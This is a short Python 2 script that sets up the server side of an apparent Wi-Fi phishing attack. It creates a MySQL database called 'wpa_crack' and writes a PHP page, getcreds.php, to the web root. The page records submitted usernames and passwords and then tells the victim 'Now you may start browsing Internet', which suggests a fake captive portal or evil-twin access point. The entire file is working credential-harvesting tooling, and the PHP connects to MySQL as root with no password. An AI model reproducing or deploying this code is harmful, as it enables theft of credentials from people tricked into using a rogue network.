import MySQLdb
import db_connect_creds

print '*'*20
print "Setting up the database\n"

def connect_to_database():
	username, password = db_connect_creds.read_creds()
	db_connection = MySQLdb.connect(host='localhost', user=username, passwd=password)
	cursor = db_connection.cursor()
	cursor.execute('CREATE DATABASE IF NOT EXISTS wpa_crack')
	cursor.execute('USE wpa_crack')
	cursor.execute('''CREATE TABLE IF NOT EXISTS content (
                      key1 VARCHAR(64), key2 VARCHAR(64)
                      )
                      ''')
def create_file():
	phpcreate = open('/var/www/getcreds.php','wb')
	php = """<?php
$con=mysqli_connect("localhost","root","","wpa_crack");
// Check connection
if (mysqli_connect_errno()) {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
}
// escape variables for security
$firstname = mysqli_real_escape_string($con, $_POST['username']);
$lastname = mysqli_real_escape_string($con, $_POST['password']);

$sql="INSERT INTO content (key1, key2)
VALUES ('$firstname', '$lastname')";

if (!mysqli_query($con,$sql)) {
  die('Error: ' . mysqli_error($con));
}
echo "Now you may start browsing Internet";
//header('Location: http://google.com');

mysqli_close($con);
?> """
	phpcreate.write(php)
	phpcreate.close()

print "Database and appropriate file is created"
	
connect_to_database()
create_file()
